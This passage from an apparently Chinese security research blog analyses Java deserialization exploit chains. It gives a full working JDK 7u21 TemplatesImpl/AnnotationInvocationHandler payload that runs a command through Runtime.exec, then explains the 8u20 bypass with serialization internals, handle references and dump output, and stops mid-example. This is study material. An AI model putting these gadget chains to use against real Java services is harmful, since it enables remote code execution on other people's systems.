class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//1.先创建恶意类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass tempExploitClass = pool.makeClass(<span class="string">"3xpl01t"</span>);</span><br><span class="line">        <span class="comment">//一定要设置父类，为了后续顺利</span></span><br><span class="line">        tempExploitClass.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">//写入payload，生成字节数组</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open /Applications/IINA.app\");"</span>;</span><br><span class="line">        tempExploitClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] exploitBytes = tempExploitClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件</span></span><br><span class="line">        TemplatesImpl tmpl = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//设置_bytecodes属性为exploitBytes</span></span><br><span class="line">        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exploitBytes&#125;);</span><br><span class="line">        <span class="comment">//一定要设置_name不为空</span></span><br><span class="line">        Field _name = TemplatesImpl.class.getDeclaredField("_name");</span><br><span class="line">        _name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(tmpl, <span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">//_class为空</span></span><br><span class="line">        Field _class = TemplatesImpl.class.getDeclaredField("_class");</span><br><span class="line">        _class.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _class.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//整个map,容量为2</span></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap(<span class="number">2</span>);</span><br><span class="line">        String magicStr = <span class="string">"f5a5a608"</span>;</span><br><span class="line">        <span class="comment">// 放入实际的 value</span></span><br><span class="line">        map.put(magicStr, tmpl);</span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler invocationHandler = (InvocationHandler) cons.newInstance(Templates<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>;</span><br><span class="line"></span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, invocationHandler);</span><br><span class="line"></span><br><span class="line">        HashSet target = <span class="keyword">new</span> LinkedHashSet();</span><br><span class="line">        target.add(tmpl);</span><br><span class="line">        target.add(proxy);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_jdk7u21.ser"</span>)));</span><br><span class="line">        fout.writeObject(target);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_jdk7u21.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="8u20"><a href="#8u20" class="headerlink" title="8u20"></a>8u20</h1><p>环境：</p><ul><li>jdk &lt;= 8u20</li></ul><p>在说8u20之前，说一下7u21的修复：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521143008667.png" alt="image-20210521143008667"></p><p>可以看到，AnnotationInvocationHandler的readObject方法把this.type属性限制了<code>只能是注解</code>，所以我们7u21用的是<code>Templates.class</code>，是为了后续的<code>TemplatesImpl</code>的instanceof的检查可以通过。</p><p>在8u20中使用<code>BeanContextSupport</code>类对这个修补方式进行了绕过。</p><h2 id="基础知识补充-序列化"><a href="#基础知识补充-序列化" class="headerlink" title="基础知识补充-序列化"></a>基础知识补充-序列化</h2><p>整个例子</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521160220634.png" alt="image-20210521160220634"></p><p>在ObjectOutputStream位置下个断点</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521155206766.png" alt="image-20210521155206766"></p><p>跟进去看，构造函数就做了很多事情，会来到writeStreamHeader方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521160415081.png" alt="image-20210521160415081"></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521160518217.png" alt="image-20210521160518217"></p><p>写入了<code>aced0005</code></p><p>接下来看下<code>out.writeObject(object)</code>是怎么写入数据的？</p><p>会先解析class结构，判断是否实现了Serializable接口，是的话执行<code>writeOrdinaryObject</code>方法</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521160831777.png" alt="image-20210521160831777"></p><p>看下图，首先写入<code>TC_OBJECT,</code>常量<code>TC_OBJECT</code>的值是<code>(byte)0x73</code>，之后调用<code>writeClassDesc</code>方法写入类描述符，然后会调用到<code>writeNonProxyDesc</code>方法</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521164415007.png" alt="image-20210521164415007"></p><p>进入writeNonProxyDesc方法，</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521164739263.png" alt="image-20210521164739263"></p><p>写入<code>TC_CLASSDESC</code>的值是0x72，然后进入writeNonProxy方法</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521164704196.png" alt="image-20210521164704196"></p><p>跟进去看看<code>getSerialVersionID</code>是做什么的，看下图可以发现，默认获取对象的<code>serialVersionUID</code>值，如果对象<code>serialVersionUID</code>的值为空则会计算出一个<code>serialVersionUID</code>的值</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521165047244.png" alt="image-20210521165047244"></p><p>返回writeNonProxy方法看看之后做了什么事情：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521170116717.png" alt="image-20210521170116717"></p><p>回到writeNonProxyDesc方法</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521170318982.png" alt="image-20210521170318982"></p><p>可以看到在对当前对象的序列化之后，进行了对父类对象的序列化，写入父类的class结构信息。</p><p>到这里子类和父类的class都写完了。</p><p>接下来回到代码，接下来会进入writeSerialData写入对象的属性值。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521170927503.png" alt="image-20210521170927503"></p><p>进入可以看到slots存放的是对象数组，先是父类，然后才是子类对象：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521171332673.png" alt="image-20210521171332673"></p><p>这里梳理一下流程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">序列化类结构信息： 子类 - &gt; 父类</span><br><span class="line">  </span><br><span class="line">序列化对象信息： 父类 - &gt; 子类</span><br></pre></td></tr></table></figure><h2 id="利用链构造-2"><a href="#利用链构造-2" class="headerlink" title="利用链构造"></a>利用链构造</h2><p>这里我们先看一下8u20下AnnotationInvocationHandler类的readObject方法</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521174334090.png" alt="image-20210521174334090"></p><p>两步骤：</p><ul><li>先执行var1.defaultReadObject()来还原对象，从流里还原对象</li><li>检查this.type进行了是否为注解类，如果不是的话就报错</li></ul><p>注意<strong>AnnotationInvocationHandler 这个对象是先被成功还原</strong>，然后再抛出的异常。绕过就是利用了这一点。</p><p>这里compare一下<code>jdk7u21</code>的修复方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 改之前</span></span><br><span class="line">AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    annotationType = AnnotationType.getInstance(type);</span><br><span class="line">&#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">    <span class="comment">// Class is no longer an annotation type; all bets are off</span></span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改之后</span></span><br><span class="line">AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    annotationType = AnnotationType.getInstance(type);</span><br><span class="line">&#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">    <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> java.io.InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意<strong>AnnotationInvocationHandler 这个对象是先被成功还原</strong>，然后再抛出的异常。</p><h3 id="readObject-amp-defaultReadObject"><a href="#readObject-amp-defaultReadObject" class="headerlink" title="readObject &amp; defaultReadObject"></a>readObject &amp; defaultReadObject</h3><p>这里简单提一下这两个序列化流程中的重点函数：</p><ul><li><p><strong>defaultReadObject</strong></p><p>用来执行<strong>默认</strong>的反序列化流程。简单来说就是<strong>将非静态、非<code>transient</code>修饰的代码进行反序列化</strong>。</p></li><li><p><strong>readObject</strong></p><p>如果对象自己实现了readObject方法，那么就会执行对象自身的readObject方法。</p></li></ul><p>参考<a href="https://buaq.net/go-78144.html" target="_blank" rel="noopener">这篇</a></p><blockquote><p>根据 oracle 官方定义的 Java 中可序列化对象流的原则:</p><p>如果一个类中定义了<code>readObject</code>方法，那么这个方法将会取代默认序列化机制中的方法读取对象的状态，</p><p><strong>可选的信息</strong>可依靠这些方法读取，而<strong>必选数据部分</strong>要依赖<code>defaultReadObject</code>方法读取；</p></blockquote><p>我们看AnnotationInvocationHandler的readObject方法。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210715163322257.png" alt="image-20210715163322257"></p><p>第一行就调用了<code>defaultReadObject</code>方法，该方法主要就是从字节流中读取对象的<strong>字段值</strong>，它可以从字节流中按照定义对象的<strong>类描述符</strong>以及定义的顺序读取<strong>字段的名称</strong>和<strong>类型信息</strong>。这些值会通过匹配当前类的字段名称的方式来赋予，如果当前这个对象中的某个字段并没有在字节流中出现，则这些字段会使用类中定义的默认值。</p><p><strong>如果这个值出现在字节流中，但是并不属于对象，则抛弃该值</strong>。</p><p><strong>如果这个值是一个对象的话，那么会为这个值分配一个Handle</strong></p><p>在利用<code>defaultReadObject()</code>还原了一部分对象的值后，最近进行<code>AnnotationType.getInstance(type)</code>判断，如果传入的 type 不是<code>AnnotationType</code>类型，那么抛出异常。</p><p>也就是说，实际上在<code>jdk7u21</code>漏洞中，我们传入的<code>AnnotationInvocationHandler</code>对象在异常被抛出前，已经从序列化数据中被还原出来。换句话说就是我们把恶意的种子种到了运行对象中，但是因为出现异常导致该种子没法生长，只要我们解决了这个异常，那么就可以重新达到我们的目的。</p><p><strong>这也就是<code>jdk8u20</code>漏洞的原理——绕过异常。</strong></p><h3 id="有趣的Try-amp-Catch-amp-Throw"><a href="#有趣的Try-amp-Catch-amp-Throw" class="headerlink" title="有趣的Try &amp; Catch &amp; Throw"></a>有趣的Try &amp; Catch &amp; Throw</h3><p>总结panda师傅的实验：</p><p>假设a方法有try-catch-throw，b方法只有try-catch: 以下 <code>-&gt;</code>表示调用</p><p>分类讨论：</p><ul><li>如果<code>a -&gt;b</code>，如果b中出现异常，由于没有throw，并不会影响a后续的执行流程。</li><li>如果<code>b-&gt;a</code>，如果a中出现异常，a会将异常throw给上一级的b，被b方法catch住，b方法中断，b后续就不会再继续执行了。</li></ul><h3 id="什么是反序列化句柄Handle"><a href="#什么是反序列化句柄Handle" class="headerlink" title="什么是反序列化句柄Handle"></a>什么是反序列化句柄Handle</h3><p>Handle值是每一个对象自身的一个字段。</p><p>在序列化数据中，存在的对象有null、new objects、classes、arrays、strings、back references等，这些对象在序列化结构中都有对应的描述信息，并且每一个写入字节流的对象都会被赋予引用<code>Handle</code>，并且这个引用<code>Handle</code>可以反向引用该对象（使用<code>TC_REFERENCE</code>结构，引用前面handle的值），引用<code>Handle</code>会从<code>0x7E0000</code>开始进行顺序赋值并且自动自增，一旦字节流发生了重置则该引用Handle会重新从<code>0x7E0000</code>开始。</p><p>如果你连续两次序列化同一个对象，那么第二次序列化写入的就是第一个对象的handle。</p><p>可以发现，因为我们两次 writeObject 写入的其实是同一个对象，所以 Date 对象的数据只在第一次 writeObject 的时候被真实写入了。而第二次 writeObject 时，写入的是一个 TC_REFERENCE 的结构，随后跟了一个4 字节的 Int 值，值为 0x00 7e 00 01。这是什么意思呢？意思就是第二个对象引用的其实是 handle 为 0x00 7e 00 01 的那个对象。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521192832251.png" alt="image-20210521192832251"></p><p>在反序列化进行读取的时候，因为之前进行了两次 writeObject，所以为了读取，也应该进行两次 readObject：</p><ol><li>第一次 readObject 将会读取 TC_OBJECT 表示的第 1 个对象，发现是 Date 类型的对象，然后从流中读取此对象成员的值并还原。并为此 Date 对象分配一个值为 0x00 7e 00 01 的 handle。</li><li>第二个 readObject 会读取到 TC_REFERENCE，说明是一个引用，引用的是刚才还原出来的那个 Date 对象，此时将直接返回之前那个 Date 对象的引用。</li></ol><p>在<a href="https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/">反序列化流程梳理</a>这篇，在最开始的switch-case时候，如果是一个TC_REFERENCE，调用的是readHandle：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> TC_REFERENCE:</span><br><span class="line">       <span class="keyword">return</span> readHandle(unshared);</span><br></pre></td></tr></table></figure><p>跟进去看<code>readHandle</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Reads in object handle, sets passHandle to the read handle, and returns</span></span><br><span class="line"><span class="comment"> * object associated with the handle.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">readHandle</span><span class="params">(<span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (bin.readByte() != TC_REFERENCE) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">    &#125;</span><br><span class="line">    passHandle = bin.readInt() - baseWireHandle;</span><br><span class="line">    <span class="keyword">if</span> (passHandle &lt; <span class="number">0</span> || passHandle &gt;= handles.size()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(</span><br><span class="line">            String.format(<span class="string">"invalid handle value: %08X"</span>, passHandle +</span><br><span class="line">            baseWireHandle));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (unshared) &#123;</span><br><span class="line">        <span class="comment">// REMIND: what type of exception to throw here?</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(</span><br><span class="line">            <span class="string">"cannot read back reference as unshared"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object obj = handles.lookupObject(passHandle);</span><br><span class="line">    <span class="keyword">if</span> (obj == unsharedMarker) &#123;</span><br><span class="line">        <span class="comment">// REMIND: what type of exception to throw here?</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(</span><br><span class="line">            <span class="string">"cannot read back reference to unshared object"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    filterCheck(<span class="keyword">null</span>, -<span class="number">1</span>);       <span class="comment">// just a check for number of references, depth, no class</span></span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这方法首先读取TC_REFERENCE字段，接下来把读取的Handle的值传递个passHandle变量</p><p>来到<code>Object obj = handles.lookupObject(passHandle);</code> 跟进去看源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Looks up and returns object associated with the given handle.</span></span><br><span class="line"><span class="comment"> * Returns null if the given handle is NULL_HANDLE, or if it has an</span></span><br><span class="line"><span class="comment"> * associated ClassNotFoundException.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">Object <span class="title">lookupObject</span><span class="params">(<span class="keyword">int</span> handle)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (handle != NULL_HANDLE &amp;&amp;</span><br><span class="line">            status[handle] != STATUS_EXCEPTION) ?</span><br><span class="line">        entries[handle] : <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>lookupObject判断如果引用的<code>handle</code>不为空、并且没有关联的<code>ClassNotFoundException</code>（<code>status[handle] != STATUS_EXCEPTION</code>），那么就返回给定<code>handle</code>的引用对象。</p><p>所以这里的逻辑就是，<strong>一旦在反序列化过程中发现有TC_REFERENCE的时候，会尝试还原引用的handle对象</strong>。</p><h3 id="如何插入数据？"><a href="#如何插入数据？" class="headerlink" title="如何插入数据？"></a>如何插入数据？</h3><p>思考一个问题，如果我们在序列化的过程中，再向流内写东西，会发生什么？</p><p>做个实验：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Twice</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">100L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream oos)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        oos.defaultWriteObject();</span><br><span class="line">        oos.writeObject(<span class="string">"ORANGE"</span>);</span><br><span class="line">        oos.writeUTF(<span class="string">"This is a sentence!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Twice t = <span class="keyword">new</span> Twice();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"twice1.ser"</span>));</span><br><span class="line">        oos.writeObject(t);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下twice2.ser:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar SerializationDumper.jar -r twice1.ser</span><br><span class="line"></span><br><span class="line">STREAM_MAGIC - <span class="number">0xac</span> ed</span><br><span class="line">STREAM_VERSION - <span class="number">0x00</span> <span class="number">05</span></span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - <span class="number">0x73</span></span><br><span class="line">    TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">      className</span><br><span class="line">        Length - <span class="number">20</span> - <span class="number">0x00</span> <span class="number">14</span></span><br><span class="line">        Value - com.fxc.serial.Twice - <span class="number">0x636f6d2e6678632e73657269616c2e5477696365</span></span><br><span class="line">      serialVersionUID - <span class="number">0x00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">64</span></span><br><span class="line">      newHandle <span class="number">0x00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">00</span></span><br><span class="line">      classDescFlags - <span class="number">0x03</span> - SC_WRITE_METHOD | SC_SERIALIZABLE</span><br><span class="line">      fieldCount - <span class="number">0</span> - <span class="number">0x00</span> <span class="number">00</span></span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - <span class="number">0x70</span></span><br><span class="line">    newHandle <span class="number">0x00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">01</span></span><br><span class="line">    classdata</span><br><span class="line">      com.fxc.serial.Twice</span><br><span class="line">        values</span><br><span class="line">        objectAnnotation</span><br><span class="line">          TC_STRING - <span class="number">0x74</span></span><br><span class="line">            newHandle <span class="number">0x00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">02</span></span><br><span class="line">            Length - <span class="number">6</span> - <span class="number">0x00</span> <span class="number">06</span></span><br><span class="line">            Value - ORANGE - <span class="number">0x4f52414e4745</span></span><br><span class="line">          TC_BLOCKDATA - <span class="number">0x77</span></span><br><span class="line">            Length - <span class="number">21</span> - <span class="number">0x15</span></span><br><span class="line">            Contents - <span class="number">0x00135468697320697320612073656e74656e636521</span></span><br><span class="line">          TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br></pre></td></tr></table></figure><p>可以发现：</p><ul><li>首先<code>classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE</code>有注明，对象有实现writeObject方法</li><li>其次在classdata下面出现了<code>objectAnnotation</code>字段，两个对象<ul><li>一个是我们写入的String对象“ORANGE”</li><li>第二个是一个BlockData “This is a sentence!” </li></ul></li></ul><p>TC_ENDBLOCKDATA标志着对象结束</p><p>现在我们当然想在writeObject的时候就插入恶意数据</p><p>简单粗暴，一切都是二进制，<strong>我们直接手动写入一段<code>objectAnnotation</code>就可以了</strong>。</p><p>先看一个小例子，复盘一下<a href>panda</a>师傅的实验。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">10L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> zero;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AnnotationInvocationHandler</span><span class="params">(<span class="keyword">int</span> zero)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.zero = zero;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Process shell = Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream input)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        